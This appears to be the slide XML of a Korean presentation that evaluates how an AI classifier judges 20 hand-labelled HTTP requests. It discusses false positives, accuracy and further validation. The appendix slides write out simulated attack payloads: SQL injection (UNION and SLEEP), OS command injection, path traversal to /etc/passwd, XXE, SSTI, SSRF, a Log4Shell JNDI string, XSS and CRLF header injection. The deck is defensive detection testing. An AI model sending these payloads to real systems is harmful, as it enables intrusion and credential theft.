            <a:ext cx="1386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공격 = 공격 의도·모사 패턴 기준. 취약점 존재, 서버 실행 또는 침해 성공을 의미하지 않음.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="52295359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7B2682-2E29-4590-B644-61373FE1A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화면의 개별 ‘정확도’ 값 해석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7EB34E-5D93-48D6-ACE4-6DA59BBB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각 로그의 출력값을 그대로 표시. 데이터셋 정확도 70.0%는 별도로 계산한 지표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BDED51-A60A-4EFA-945F-FE8E285BA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85800" y="2257425"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="13868400" cy="4076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2e8672c476a42c4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9AABAD-A2D8-4D70-BCC8-55FEA8D3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13868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주황: FP    청록: TP    회색: TN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DF552E-FDAE-40C1-A36A-9E52CA4F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0"/>
            <a:ext cx="13868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0.31도 공격, 0.39는 정상. 0.5 기준으로 판정을 재계산할 근거가 없다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="69939194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4D736B-BF66-4A5E-8466-723E0204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해석의 한계와 후속 검증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B2D98A-200E-4692-8284-825382A2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이번 표본에서는 정상 요청의 오탐 감소가 주요 개선 과제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AFB012-661A-422C-B578-5DA52D54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6E948E-7D28-4175-81A0-7762A08E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오탐 6건의 재검토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5A0785-2812-4C0A-B22A-25E0D6E7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90750"/>
            <a:ext cx="1026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S01·S03·S05·S06·S08·S10을 정상 피드백 후보로 검토한다.</a:t>
            </a:r>
          </a:p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어휘만으로 공격을 추정했는지는 모델 내부 근거가 있어야 확인할 수 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C045DC-037F-4546-A49B-3B295244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입력과 결과 추적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60F8DA-ED5A-483A-9876-CDE61526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71875"/>
            <a:ext cx="1026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전송 원문, 파서 payload, 이벤트 ID, 티켓 ID, AI 입력을 연결한다.</a:t>
            </a:r>
          </a:p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모델 버전·전처리·실행 시각을 함께 남겨 같은 조건으로 재평가한다.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37F9F6-537C-4AFE-9C97-F82D5C5D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평가 데이터 분리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3B5E95-1765-408C-ACD2-535E4822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53000"/>
            <a:ext cx="1026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학습에 사용하지 않은 정상·공격 로그로 다시 평가한다.</a:t>
            </a:r>
          </a:p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이번 20건만으로 학습 효과나 운영 환경의 성능 개선을 입증할 수 없다.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F114AC-6DD4-41B8-AF74-4F11B174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34250"/>
            <a:ext cx="1386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피드백 저장 완료와 재학습 실행·활성화는 별도 증거가 필요하다. 정상과 공격을 함께 재검증해 오탐·미탐 변화를 확인한다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="80778190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2DB802-43FA-4646-8D90-244A1651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원문 부록  S01 · S02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6EC04B-1973-4666-B315-AFFA160A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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 \r\n과 인코딩·이스케이프 표기를 유지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D0A303-6D40-4389-BCCE-CC97D057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DA0B40-8D4F-4E3A-9D2B-5F181A220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S01   상대경로 리디렉션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F10C8B-0C01-4B6A-8388-FDFA05F5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0027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rPr>
              <a:t>수동 정상   화면 0.47   모델 공격   FP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5EFFE4-E4CA-4ECC-8268-74EAC694E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GET /redirect?next=%2Fhome HTTP/1.1\r\n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Host: host-37\r\n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Connection: close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141A42-C78F-4C90-B7C9-B4BDFF87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S02   파일 업로드 발췌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616223-4ABA-489C-8297-8F7DB50E3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7682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수동 정상   화면 0.39   모델 정상   TN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A3E28F-DCA7-4D69-8E08-014C14EF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POST /upload HTTP/1.1\r\n</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="17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Host: host-11\r\n</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="17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Content-Type: multipart/form-data; boundary=EVALBOUNDARY\r\n</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="17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\r\n</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="17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--EVALBOUNDARY\r\n</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="17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Content-Disposition: form-data; name="홍길동 11"; filename="C:/ProgramData/Your-Company/SecurityData/event-</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="17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11.dat"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="87469065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8D8B2F-E8EA-4D40-90E7-23D0FF6A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원문 부록  S03 · S04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D20C8C-4BB7-4371-93DD-F60D1921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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 \r\n과 인코딩·이스케이프 표기를 유지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E8AEA6-2B1D-46C6-84C2-85F36D51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ACB55B-BB98-4CA8-BEA8-A01ACD72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S03   일반 로그인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937BAF-D420-4C96-A160-4FB4A962F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0027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rPr>
              <a:t>수동 정상   화면 0.48   모델 공격   FP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E44747-1E77-4904-9482-7D10422A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POST /login HTTP/1.1\r\n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Host: host-11\r\n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Content-Type: application/x-www-form-urlencoded\r\n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username=user01&amp;password=incorrect-password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5C897F-DE44-4958-B9D4-C0421679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S04   상태 점검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E926DE-DAFC-4CDC-A8B9-1983783F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7682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수동 정상   화면 0.30   모델 정상   TN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D98172-4AD3-4697-9F82-C28D609B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GET /health HTTP/1.1\r\n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Host: host-22\r\n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User-Agent: kube-probe/1.30\r\n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Accept: */*</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="190149125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CBCAE1-B746-470B-875E-BDD8E2DE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원문 부록  S05 · S06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A7A5CB-89E8-408F-B865-1FDD5C53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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 \r\n과 인코딩·이스케이프 표기를 유지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8AD427-F04C-4104-B88E-6453788A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C4DB4C-299F-42C7-B539-9041D412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S05   JSON 검색 조건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A0625A-FF86-4F9F-887C-146A5C15E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0027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rPr>
              <a:t>수동 정상   화면 0.31   모델 공격   FP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815C66-9B87-492E-BFEB-264A5053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POST /api/search HTTP/1.1\r\n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Host: host-11\r\n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Content-Type: application/json\r\n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{"operator":"union","fields":["name","department"],"page":1}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4182CE-428E-44C8-82D4-D1149D82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S06   정상 ping 요청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5A438D-6E00-4739-9ED6-9D8B6FDD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7682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rPr>
              <a:t>수동 정상   화면 0.60   모델 공격   FP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F3F76E-D9D7-4BF8-A084-148AEEE64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POST /tools/ping HTTP/1.1\r\n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Host: host-12\r\n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Content-Type: application/x-www-form-urlencoded\r\n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host=127.0.0.1&amp;count=4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="191268114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ECC7BC-6BAA-439B-9184-4C8DC255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원문 부록  S07 · S08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F8FA7B-AF42-4DF7-B19A-D5A7D746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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 \r\n과 인코딩·이스케이프 표기를 유지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F682CC-6539-4598-A016-EC6CD9C4D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3E7261-9FD3-4364-8BC2-F661F4968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S07   일반 파일 다운로드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A3EC81-A13E-489F-A744-E08BBFB0D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0027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수동 정상   화면 0.35   모델 정상   TN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15328B-8F72-4D75-9456-0ABB6FD5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GET /download?file=quarterly..final.pdf HTTP/1.1\r\n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Host: host-41\r\n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Accept: application/pdf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446BA3-2645-49C8-B645-46F4846D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S08   기술 문서 검색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6DA01F-F268-46E9-9A81-41FC5E80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7682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rPr>
              <a:t>수동 정상   화면 0.43   모델 공격   FP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E820EA-467A-4FDA-AF47-EB27DCAA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GET /docs/search?q=HTML%20script%20element%20reference HTTP/1.1\r\n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Host: host-3\r\n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Referer: [https://host-3/docs](https://host-3/docs)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="149692997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985096-D12A-41B1-A10C-CE33DC51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원문 부록  S09 · S10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E0442D-EAE5-4167-B8BB-96C97CA4D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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 \r\n과 인코딩·이스케이프 표기를 유지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535EE9-EDA1-4EA5-BA93-E99DE787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AC499B-1330-4B9E-A568-016827312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S09   자연어 검색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8991E6-10F5-4C42-9DF8-CB2D2A7E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0027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수동 정상   화면 0.27   모델 정상   TN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4BC4D0-877D-499A-BCD3-62FF6F6F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GET /search?q=how%20to%20select%20a%20health%20plan HTTP/1.1\r\n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Host: host-31\r\n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Accept: text/html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6D6114-9444-4968-8763-4FF291DB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S10   상품 목록 조회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2628F7-73C9-4E9B-B749-5A5B4298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7682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rPr>
              <a:t>수동 정상   화면 0.65   모델 공격   FP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EBD8B7-083E-491F-8E24-E09CC69E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GET /products?id=10&amp;sort=price&amp;direction=asc HTTP/1.1\r\n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Host: host-7\r\n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User-Agent: Mozilla/5.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="161375016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D28DED-37DB-49A3-AF26-26B12E5B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원문 부록  S11 · S12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61D708-626C-4808-94D5-865D64E3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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 \r\n과 인코딩·이스케이프 표기를 유지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E7F06F-C83D-4508-A4E1-D1CD4BE2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AE25B5-60CA-477F-8535-CD3DB7EC7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S11   CRLF / 헤더 삽입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5973AE-8A5D-4FF1-8D46-DB5212D1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0027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rPr>
              <a:t>수동 공격   화면 0.43   모델 공격   TP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D768F2-56D7-42B4-99DF-7C048E7C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GET /redirect?next=%2Fhome%0D%0AX-Test-Injected%3A%20true HTTP/1.1\r\n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Host: host-37\r\n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Connection: close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8EE0FA-F3C1-440E-AF58-F2EA1978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S12   XML 외부 엔터티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31621F-DBE9-4A75-9E91-8EACD86B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7682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rPr>
              <a:t>수동 공격   화면 0.46   모델 공격   TP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BFD552-60B9-41A4-B06E-2793A0B1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POST /api/import HTTP/1.1\r\n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Host: host-11\r\n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Content-Type: application/xml\r\n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%3C%21DOCTYPE%20r%20%5B%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fhostname%22%3E%5D%3E%3Cr%3E%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26x%3B%3C%2Fr%3E</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="161245534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618996-6F0D-420C-8231-4D5FD3094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원문 부록  S13 · S14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0436AF-FFD7-4F19-AC14-E5917503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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 \r\n과 인코딩·이스케이프 표기를 유지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67C951-145F-4486-A8D2-536A14F4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0B10FE-F9E1-45D6-A843-1539E52B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S13   서버 템플릿 삽입 모사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C6C622-F27E-4A46-9802-EA751FA1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0027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rPr>
              <a:t>수동 공격   화면 0.37   모델 공격   TP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6FAF4D-204C-431C-B112-289FBBBA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GET /welcome?name=%7B%7B7\*7%7D%7D HTTP/1.1\r\n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Host: host-11\r\n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Accept: text/html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08B14A-FEE8-4F5F-8472-942BB2D0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S14   SSRF 모사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132C90-24AE-4B7C-919A-3C0AE966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7682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rPr>
              <a:t>수동 공격   화면 0.67   모델 공격   TP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B5F9BE-083D-4E06-96A9-52960A7D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POST /preview HTTP/1.1\r\n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Host: host-22\r\n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Content-Type: application/x-www-form-urlencoded\r\n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url=http%3A%2F%2F192.0.2.20%2Flatest%2Fmeta-data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="206165170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508B0B-150D-43D3-804F-1C4AAED4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원문 부록  S15 · S16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C37EEF-157C-4DB2-BE6D-D5188849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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 \r\n과 인코딩·이스케이프 표기를 유지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3E812C-1DA0-457E-9F49-5E75936B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622810-7269-4285-B562-BCC3058D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S15   Log4Shell 패턴 모사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D87F32-0E7C-4C78-A345-5465D9C7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0027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rPr>
              <a:t>수동 공격   화면 0.51   모델 공격   TP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0B546E-2135-4662-86A3-B4D343D7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GET / HTTP/1.1\r\n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Host: host-11\r\n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User-Agent: ${jndi:ldap\://192.0.2.123:1389/test-only}\r\n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X-Test-Marker: AI-EVAL-9006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25EEAA-4FF1-4C30-B998-1BEC9A2E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S16   OS 명령 삽입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7518AE-E278-499D-9A4D-BA9D048A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7682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rPr>
              <a:t>수동 공격   화면 0.60   모델 공격   TP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EC5785-5BDA-43CC-9E73-659D0D89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POST /tools/ping HTTP/1.1\r\n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Host: host-12\r\n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Content-Type: application/x-www-form-urlencoded\r\n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host=127.0.0.1%3Bid%3Buname%20-a</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="126521206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2FDD8F-A39F-4350-9E77-FDC95537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원문 부록  S17 · S18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2E9385-9E8A-45A4-82EF-8F498B044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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 \r\n과 인코딩·이스케이프 표기를 유지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0A3913-9B66-4FC9-866E-5A3B34DC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B00823-1BB8-48F2-AAFE-6654B67FE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S17   경로 순회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715FE1-AD3A-4E66-BF3D-EE4F2A270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0027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rPr>
              <a:t>수동 공격   화면 0.63   모델 공격   TP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48BFB0-E16E-496C-9E40-849CF2B45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GET /download?file=../../../../etc/passwd HTTP/1.1\r\n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Host: host-41\r\n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Accept: application/octet-stream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471D65-4561-40C4-9919-9E968978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S18   XSS 삽입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375166-C7C0-4911-9BD2-2511A675F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7682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rPr>
              <a:t>수동 공격   화면 0.45   모델 공격   TP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EF5C4F-E81F-47ED-B96F-80C33D15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GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1\r\n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Host: host-3\r\n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Referer: [https://host-3/](https://host-3/)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="120475441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689CDC-D19F-4ECC-ACE4-DBAD9C21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원문 부록  S19 · S20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476531-D40B-4ABD-9ABC-E94E9F1C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제공 문자열 전체. 읽기용 줄바꿈을 추가했으며 \r\n과 인코딩·이스케이프 표기를 유지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CD313A-AB74-40D1-B36E-47981CDB4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FC10A-EC73-46BE-B2CA-81F23516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S19   시간 지연 SQL 삽입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7B9D2B-9AD5-47D7-89E3-9653DF172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0027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rPr>
              <a:t>수동 공격   화면 0.57   모델 공격   TP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4E41A1-8735-4581-BB17-D94DF2C5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POST /login HTTP/1.1\r\n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Host: host-31\r\n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Content-Type: application/x-www-form-urlencoded\r\n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username=admin%27%20AND%20SLEEP%285%29--&amp;password=test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B545F2-0A7F-4F79-9B74-4C5F0242F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S20   UNION SQL 삽입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0838EF-2311-440E-A8C5-19AD729B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7682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rPr>
              <a:t>수동 공격   화면 1.00   모델 공격   TP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E18C5A-C33B-4718-91E2-385B8227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GET /products?id=10%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\n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Host: host-7\r\n</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:def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User-Agent: Mozilla/5.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="58629871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EB0A33-12BD-4BCD-BF45-3FD34CD0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근거 자료와 확인 범위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042779-9B9C-4E82-86A6-4F1C03A2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판정 근거, 계산 결과, 제품 동작 설명의 출처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EFF92A-4432-4592-A2A2-CB4DE5BD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8112D1-795F-4138-A49D-3CE734DD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직접 제공한 증거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17DDB6-2A0D-4F77-95BC-3F6128E8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33600"/>
            <a:ext cx="1026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HTTP 요청·화면 값·모델 판정 20건</a:t>
            </a:r>
          </a:p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AI TEST 티켓 목록 20건과 플레이북 화면 1장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32AD27-85C6-4D56-BBDF-9C8DBDC2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7575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제품 동작 참고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7E0D52-18B8-4982-91F4-78D7C265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57575"/>
            <a:ext cx="1026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LogGenerator 현재 README의 로그 전송 절차</a:t>
            </a:r>
          </a:p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eyeCloudXOAR v4 사용자 매뉴얼과 플레이북 가이드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A59E97-ABA7-4594-B238-037C5414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공격 유형 기준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A8B75D-A8E5-4FB4-8A01-37651FC9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81550"/>
            <a:ext cx="1026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OWASP의 SQL·명령·XML·템플릿 삽입 및 경로 순회 자료</a:t>
            </a:r>
          </a:p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Apache Log4j 보안 공지, RFC 5737, Kubernetes Probe 문서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182E8B-1614-4670-9072-25166EDF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확인 범위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B138B2-B1C2-4575-BF0E-564630964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334125"/>
            <a:ext cx="102679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제공된 기록의 사후 분석. 서버 수신, 설정 저장, 티켓별 로그 매핑,</a:t>
            </a:r>
          </a:p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피드백 DB 반영과 재학습 완료는 직접 검증하지 않았다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21343258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2026-09-09T03:15:57.6450000Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-09T03:15:57.6450000Z</dcterms:modified>
</coreProperties>
</file>